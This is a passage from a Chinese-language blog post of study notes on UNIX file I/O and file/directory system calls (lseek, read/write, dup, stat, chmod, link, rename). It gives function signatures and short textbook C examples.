class="hljs-type">int</span> fd)</span>;<br></code></pre></td></tr></table></figure><h2 id="lseek"><a href="#lseek" class="headerlink" title="lseek"></a>lseek</h2><p>搜索文件偏移，该函数执行记录了内核中记录文件偏移的数据，不需要执行<code>I/O</code>操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">off_t</span> <span class="hljs-title function_">lseek</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">off_t</span> offset,<span class="hljs-type">int</span> whence)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>fd</code>文件描述符</li><li><code>offset</code>偏移</li><li><code>whence</code>为指定<code>offset</code>的位置<ul><li><code>whence = SEEK_SET</code>，偏移从文件起始位置计算</li><li><code>whence = SEEK_CUR</code>，偏移从文件当前偏移开始计算</li><li><code>whence = SEEK_END</code>，偏移从文件末尾开始计算</li></ul></li></ul><p><code>lseek</code>函数的两个功能</p><p><strong>获取当前文件的偏移</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">off_t</span> currpos;<br>currpos = lseek(fd, <span class="hljs-number">0</span>, SEEK_CUR);<br></code></pre></td></tr></table></figure><p><strong>判断当前文件是否可以搜索偏移</strong></p><p><code>pipe</code>、<code>FIFO</code>以及<code>socket</code>无法使用<code>lseek</code>函数找偏移量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (lseek(STDIN_FILENO, <span class="hljs-number">0</span>, SEEK_CUR) == <span class="hljs-number">-1</span>)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;cannot seek\n&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;seek OK\n&quot;</span>);<br>   <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="read"><a href="#read" class="headerlink" title="read"></a>read</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *buf, <span class="hljs-type">unsigned</span> nbytes)</span>;<br></code></pre></td></tr></table></figure><p><code>read</code>函数有以下五种情况读取字节少于参数指定的字节</p><ul><li>读到文件尾，返回<code>0</code></li><li>从终端设备读取数据，一次只返回一行</li><li>从网络读取的数据大小取决于网络的缓冲区</li><li>从管道或<code>FIFO</code>读取数据时取决于管道内的数据大小</li><li>被信号所中断</li></ul><h2 id="write"><a href="#write" class="headerlink" title="write"></a>write</h2><p>将数据写入打开的文件里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">write</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> nbytes)</span>;<br></code></pre></td></tr></table></figure><p>如果写入字节数超过了文件大小或者磁盘大小则会发生错误。</p><h2 id="I-x2F-O效率"><a href="#I-x2F-O效率" class="headerlink" title="I&#x2F;O效率"></a>I&#x2F;O效率</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;apue.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFFSIZE 4096</span><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br> <span class="hljs-type">int</span> n;<br><span class="hljs-type">char</span> buf[BUFFSIZE];<br><span class="hljs-keyword">while</span> ((n = read(STDIN_FILENO, buf, BUFFSIZE)) &gt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">if</span> (write(STDOUT_FILENO, buf, n) != n)<br>err_sys(<span class="hljs-string">&quot;write error&quot;</span>);<br><span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">0</span>)<br>err_sys(<span class="hljs-string">&quot;read error&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>如何选择文件输入输出的字节的大小</strong></p><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230209225704187.png" alt="image-20230209225704187"></p><p><strong>buffsize为4096的效果最好</strong></p><h2 id="pread和pwrite"><a href="#pread和pwrite" class="headerlink" title="pread和pwrite"></a>pread和pwrite</h2><p><code>pread</code>与<code>pwrite</code>函数相当于先调用<code>lseek</code>函数后调用<code>write</code>和<code>read</code>函数，但是两个操作视作为原子操作并且当前的文件偏移不会改变</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">pread</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> nbytes, <span class="hljs-type">off_t</span> offset)</span>;<br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">pwrite</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> nbytes, <span class="hljs-type">off_t</span> offset)</span>;<br></code></pre></td></tr></table></figure><h2 id="dup和dup2"><a href="#dup和dup2" class="headerlink" title="dup和dup2"></a>dup和dup2</h2><p><code>dup</code>和<code>dup2</code>函数用于复制文件描述符，并且会清空<code>close-on-exec</code>标志位</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">dup</span><span class="hljs-params">(<span class="hljs-type">int</span> oldfd)</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">dup(oldfd)</span><br><span class="hljs-comment">fcntl(oldfd,F_DUPFD,0)</span><br><span class="hljs-comment">*/</span><br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">dup2</span><span class="hljs-params">(<span class="hljs-type">int</span> oldfd,<span class="hljs-type">int</span> newfd)</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">dup2(oldfd,newfd)</span><br><span class="hljs-comment">close(oldfd)</span><br><span class="hljs-comment">fcntl(oldfd,FDUPFD,newfd)</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">// success, these system calls return the new descriptor.  On</span><br>       error, <span class="hljs-number">-1</span> is returned, and errno is <span class="hljs-built_in">set</span> appropriately<br></code></pre></td></tr></table></figure><p><code>dup</code>函数复制参数<code>fd</code>的描述符，返回最小未被使用的文件描述符</p><p><code>dup2</code>函数将参数<code>oldfd</code>的描述符复制到<code>newfd</code>的描述符</p><ul><li>若<code>oldfd</code>是非法文件描述符，那么<code>dup2</code>函数调用失败，<code>newfd</code>不会被关闭</li><li>若<code>oldfd</code>与<code>newfd</code>指向同一个文件描述符，则不会执行任何操作，并返回<code>newfd</code></li><li>若<code>newfd</code>已经被使用，那么<code>dup2</code>会先关闭<code>newfd</code>，然后再使用</li></ul><h2 id="sysnc、fsync和fdatasync"><a href="#sysnc、fsync和fdatasync" class="headerlink" title="sysnc、fsync和fdatasync"></a>sysnc、fsync和fdatasync</h2><p>磁盘写入需要经过内核缓存区再写入磁盘中，该行为被称之为延迟写入。为了确保缓冲区内的数据与写入磁盘内的数据一致性，因此提供了<code>sysnc</code>、<code>fsync</code>和<code>fdatasync</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsync</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">fdatasync</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">sync</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>sync</code>函数只是简单的将修改后的缓冲区数据写入队列中，并不等待磁盘的写入操作</li><li><code>fsync</code>函数则是需要等待<code>fd</code>文件描述符指定的文件写入完后</li><li><code>fdatasync</code>函数与<code>fsync</code>函数类似，但是只影响数据部分</li></ul><h2 id="fcntl"><a href="#fcntl" class="headerlink" title="fcntl"></a>fcntl</h2><p>用于修改以及打开的文件属性</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fcntl</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">int</span> cmd,...<span class="hljs-comment">/* int arg */</span>)</span>;<br></code></pre></td></tr></table></figure><h2 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h2><p>上述不能操作的文件都可以使用<code>iotcl</code>函数进行操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">ioctl</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">int</span> request, ...)</span>;<br><span class="hljs-comment">//返回值：若出错，返回-1;若成功，返回其他值</span><br></code></pre></td></tr></table></figure><p>每个设备驱动程序可以定义它自己专用的一组<code>ioctl</code>命令，系统则为不同种类的设备提供通用的<code>ioctl</code>命令。</p><table><thead><tr><th>类别</th><th>常量名</th><th>头文件</th><th>ioctl数</th></tr></thead><tbody><tr><td>盘标号</td><td>DIOxxx</td><td>&lt;sys&#x2F;disklabel.h&gt;</td><td>4</td></tr><tr><td>文件I&#x2F;O</td><td>FIOxxx</td><td>&lt;sys&#x2F;filio.h&gt;</td><td>14</td></tr><tr><td>磁盘I&#x2F;O</td><td>MTIOxxx</td><td>&lt;sys&#x2F;mtio.h&gt;</td><td>11</td></tr><tr><td>套接字I&#x2F;O</td><td>STOxxx</td><td>&lt;sys&#x2F;sockio.h&gt;</td><td>73</td></tr><tr><td>终端I&#x2F;O</td><td>TIOxxx</td><td>&lt;sys&#x2F;ttycom.h&gt;</td><td>43</td></tr></tbody></table><h1 id="文件与目录"><a href="#文件与目录" class="headerlink" title="文件与目录"></a>文件与目录</h1><h2 id="stat函数"><a href="#stat函数" class="headerlink" title="stat函数"></a>stat函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">stat</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> pathname,<span class="hljs-keyword">struct</span> stat *<span class="hljs-keyword">restrict</span> buf)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">fstat</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-keyword">struct</span> stat *buf)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">lstat</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> pathname, <span class="hljs-keyword">struct</span> stat *<span class="hljs-keyword">restrict</span> buf)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">fstatat</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> pathname,<span class="hljs-keyword">struct</span> stat *<span class="hljs-keyword">restrict</span> buf,<span class="hljs-type">int</span> flag)</span>;<br><br><span class="hljs-comment">//获取成功返回0，否则返回-1或者error</span><br></code></pre></td></tr></table></figure><ul><li>stat函数<ul><li>参数一：文件路径</li><li>参数二：存储stat结构的缓存区</li></ul></li><li>fstat函数<ul><li>参数一：文件描述符</li><li>参数二：存储stat结构的缓存区</li></ul></li><li>lstat函数<ul><li>参数一：文件路径</li><li>参数二：存储stat结构的缓存区</li><li>与<code>stat</code>的区别是，当<code>pathname</code>传入的是符号链接，那么会返回符号链接的信息而不是链接文件的信息</li></ul></li><li>fstatat函数<ul><li>参数一：文件描述符，若该参数使用了标志位<code>AT_FDCWD</code>，<code>pathname</code>则采用相对路径</li><li>参数二：<code>pathname</code>，如果该参数是绝对路径，则忽略<code>fd</code>参数</li><li>参数三：存储<code>stat</code>结构的缓存区</li><li>参数四：若该标志位设置了<code>AT_SYMLINK_NOFOLLOW</code>则<code>fstatat</code>函数返回符号链接的信息，否则返回链接的原文件</li></ul></li><li><code>stat</code>结构体</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> &#123;</span><br><span class="hljs-type">mode_t</span> st_mode; <span class="hljs-comment">/* file type &amp; mode (permissions) 文件类型*/</span><br><span class="hljs-type">ino_t</span> st_ino; <span class="hljs-comment">/* i-node number (serial number) 序列数字*/</span><br><span class="hljs-type">dev_t</span> st_dev; <span class="hljs-comment">/* device number (file system) 设备号*/</span><br><span class="hljs-type">dev_t</span> st_rdev; <span class="hljs-comment">/* device number for special files 设备号指定的文件*/</span><br><span class="hljs-type">nlink_t</span> st_nlink; <span class="hljs-comment">/* number of links 链接号*/</span><br><span class="hljs-type">uid_t</span> st_uid; <span class="hljs-comment">/* user ID of owner 用户ID*/</span><br><span class="hljs-type">gid_t</span> st_gid; <span class="hljs-comment">/* group ID of owner 组ID*/</span><br><span class="hljs-type">off_t</span> st_size; <span class="hljs-comment">/* size in bytes, for regular files 文件大小*/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timespec</span> <span class="hljs-title">st_atim</span>;</span> <span class="hljs-comment">/* time of last access 最后访问时间*/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timespec</span> <span class="hljs-title">st_mtim</span>;</span> <span class="hljs-comment">/* time of last modification 最后修改时间*/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timespec</span> <span class="hljs-title">st_ctim</span>;</span> <span class="hljs-comment">/* time of last file status change 文件状态修改时间*/</span><br><span class="hljs-type">blksize_t</span> st_blksize; <span class="hljs-comment">/* best I/O block size */</span><br><span class="hljs-type">blkcnt_t</span> st_blocks; <span class="hljs-comment">/* number of disk blocks allocated */</span><br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h2><ul><li>常规文件</li><li>目录文件</li><li>块特殊文件：每个块作为单位处理</li><li>字节特殊文件：每个字节作为单位处理</li><li>FIFO：管道文件</li><li>Socket：网络通信文件</li><li>符号链接</li></ul><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20221123143919618.png" alt="image-20221123143919618"></p><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20221123143925606.png" alt="image-20221123143925606"></p><h2 id="文件访问权限"><a href="#文件访问权限" class="headerlink" title="文件访问权限"></a>文件访问权限</h2><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20221123145941766.png" alt="image-20221123145941766"></p><h2 id="access和faccessat函数"><a href="#access和faccessat函数" class="headerlink" title="access和faccessat函数"></a>access和faccessat函数</h2><p>用于判断当前进程对文件的权限</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">access</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname, <span class="hljs-type">int</span> mode)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">faccessat</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname, <span class="hljs-type">int</span> mode, <span class="hljs-type">int</span> flag)</span>;<br></code></pre></td></tr></table></figure><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20221123154536642.png" alt="image-20221123154536642"></p><ul><li>access函数<ul><li>参数一：文件路径</li><li>参数二：权限</li></ul></li><li>faccessat函数<ul><li>参数一：文件描述符，该参数标志了<code>AT_FDCWD</code>后，<code>pathname</code>为相对路径</li><li>参数二：文件路径，若该参数是绝对路径则<code>fd</code>参数忽略</li><li>访问权限</li></ul></li></ul><h2 id="umask"><a href="#umask" class="headerlink" title="umask"></a>umask</h2><p>设置默认创建文件的权限</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-type">mode_t</span> <span class="hljs-title function_">umask</span><span class="hljs-params">(<span class="hljs-type">mode_t</span> cmask)</span>;<br></code></pre></td></tr></table></figure><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20221123173523830.png" alt="image-20221123173523830"></p><h2 id="chomd-fchmod和fchmodat"><a href="#chomd-fchmod和fchmodat" class="headerlink" title="chomd,fchmod和fchmodat"></a>chomd,fchmod和fchmodat</h2><p>用于改变文件的访问权限</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">chmod</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname, <span class="hljs-type">mode_t</span> mode)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">fchmod</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">mode_t</span> mode)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">fchmodat</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname, <span class="hljs-type">mode_t</span> mode,<span class="hljs-type">int</span> flag)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>chmod</code>函数<ul><li>参数一：文件路径</li><li>参数二：权限</li></ul></li><li><code>fchmod</code>函数<ul><li>参数一：文件描述符</li><li>参数二：权限</li><li>与<code>chmod</code>函数区别为，该函数用于修改打开了的文件</li></ul></li><li><code>fchmodat</code>函数<ul><li>参数一：文件描述符，如果<code>fd</code>含有<code>AT_FDCWD</code>，那么文件路径为相对路径</li><li>参数二：文件路径，如果该参数是绝对路径，则忽略<code>fd</code>参数</li><li>参数三：权限</li><li>参数四：标志位，设置<code>AT_SYMLINK_NOFOLLOW</code>则不返回符号链接</li></ul></li></ul><p><img src="C:\Users\39738\AppData\Roaming\Typora\typora-user-images\image-20221123174632032.png" alt="image-20221123174632032"></p><h2 id="chown-fchown-fchownat-和lchown"><a href="#chown-fchown-fchownat-和lchown" class="headerlink" title="chown,fchown,fchownat,和lchown"></a>chown,fchown,fchownat,和lchown</h2><p><code>chown</code>函数允许我们更改文件的用户ID和组ID</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">chown</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname, <span class="hljs-type">uid_t</span> owner, <span class="hljs-type">gid_t</span> group)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">fchown</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">uid_t</span> owner,<span class="hljs-type">gidd_t</span> group)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">fchownat</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname,<span class="hljs-type">uid_t</span> owner, <span class="hljs-type">gid_t</span> group, <span class="hljs-type">int</span> flag)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">lchown</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname,<span class="hljs-type">uid_t</span> owner,<span class="hljs-type">gid_t</span> group)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>chown</code>函数<ul><li>参数一：文件路径</li><li>参数二：用户id</li><li>参数三：组id</li></ul></li><li><code>fchown</code>函数<ul><li>参数一：文件描述符</li><li>参数二：用户id</li><li>参数三：组id</li><li>与<code>chown</code>的区别是<code>fchown</code>函数用于修改已经打开了的文件，并且不能修改符号链接文件</li></ul></li><li><code>fchownat</code>函数<ul><li>参数一：文件描述符，若该值含有<code>AT_FDCWD</code>标志位，则<code>pathname</code>采用相对路径</li><li>参数二：文件路径，若该值采用绝对路径则忽略文件描述符</li><li>参数三：用户id</li><li>参数四：组id</li><li>参数五：标志，若该标志设置为<code>AT_SYMLINK_NOFOLLOW</code>则更改符号链接本身的所有者，否者更改符号链接指向的文件</li></ul></li><li><code>lchown</code>函数用于修改符号链接的文件的权限</li></ul><h2 id="truncate和ftruncate"><a href="#truncate和ftruncate" class="headerlink" title="truncate和ftruncate"></a>truncate和ftruncate</h2><p>用于截断文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">truncate</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname, <span class="hljs-type">off_t</span> length)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">ftruncate</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> length)</span>;<br></code></pre></td></tr></table></figure><h2 id="link-linkat-unlink-unlinkat-和-remove"><a href="#link-linkat-unlink-unlinkat-和-remove" class="headerlink" title="link,linkat,unlink,unlinkat,和 remove"></a>link,linkat,unlink,unlinkat,和 remove</h2><p>创建现有文件的链接</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">link</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *existingpath, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *newpath)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">linkat</span><span class="hljs-params">(<span class="hljs-type">int</span> efd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *existingpath, <span class="hljs-type">int</span> nfd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *newpath, <span class="hljs-type">int</span> flag)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>linkat</code>函数<ul><li><code>efd</code>与<code>existingpath</code>指出被链接的文件，<code>nfd</code>与<code>newpath</code>为链接后的文件</li><li>若使用绝对路径则忽略文件描述符</li><li>若使用相对路径，则相对于文件描述符</li><li>若文件描述含有<code>AT_FDCWD</code>标志，那么相当于当前目录</li><li>若<code>flag</code>设置为<code>AT_SYMLINK_FOLLOW</code>则链接符号链接本身，否则指向符号链接指向的文件</li></ul></li></ul><p>解除链接</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">unlink</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">unlinkat</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname,<span class="hljs-type">int</span> flag)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>unlinkat</code>函数<ul><li><code>flag</code>参数设置了<code>AT_REMOVEDIR</code>标志后，<code>unlinkat</code>函数用于删除目录</li></ul></li></ul><p>删除文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">remove</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname)</span>;<br></code></pre></td></tr></table></figure><h2 id="rename-和-renameat"><a href="#rename-和-renameat" class="headerlink" title="rename 和 renameat"></a>rename 和 renameat</h2><p>修改文件或目录名称</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">rename</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *oldname, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *rewname)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">renameat</span><span class="hljs-params">(<span class="hljs-type">int</span> oldfd,<span class="hljs-type">const</span> <span 